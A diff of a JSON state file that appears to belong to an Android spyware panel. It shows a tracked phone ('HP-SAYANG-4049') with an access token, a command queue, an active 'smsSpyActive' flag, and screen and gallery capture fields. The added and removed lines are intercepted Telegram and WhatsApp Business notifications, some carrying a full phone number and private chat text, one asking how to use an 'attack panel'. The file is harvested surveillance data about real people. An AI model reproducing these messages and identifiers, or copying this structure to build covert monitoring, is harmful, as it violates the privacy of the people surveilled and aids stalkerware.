@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775637110488,
+    "lastSeen": 1775637113575,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,70 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637112203
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637112160
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: Gok",
+        "content": "Cara pakai attack panel gimana",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637112152
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637112071
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637112026
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637111995
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: Gok",
+        "content": "Cara pakai attack panel gimana",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637111969
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "Lah",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637111920
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4254,70 +4318,6 @@
         "time": "08/04 14:42",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775634127832
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "‎4 pesan baru",
-        "time": "08/04 14:42",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634123937
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "P",
-        "time": "08/04 14:42",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634123849
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎5 pesan dari 2 chat",
-        "time": "08/04 14:41",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634094626
-      },
-      {
-        "appName": "WA Business",
-        "sender": "‎𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏 (2 pesan): Membalas Anda",
-        "content": "~ 𝖅𝕽𝕴𝕷𝖅 ℌ𝔒𝔖𝔗: @⁨Naxrat⁩ buat apa",
-        "time": "08/04 14:41",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634094547
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎4 pesan dari 2 chat",
-        "time": "08/04 14:40",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634055686
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Nope",
-        "time": "08/04 14:40",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634055537
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Gw tf aja",
-        "time": "08/04 14:40",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634052282
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎3 pesan dari 2 chat",
-        "time": "08/04 14:40",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634052277
       }
     ],
     "galleryPhotos": [],
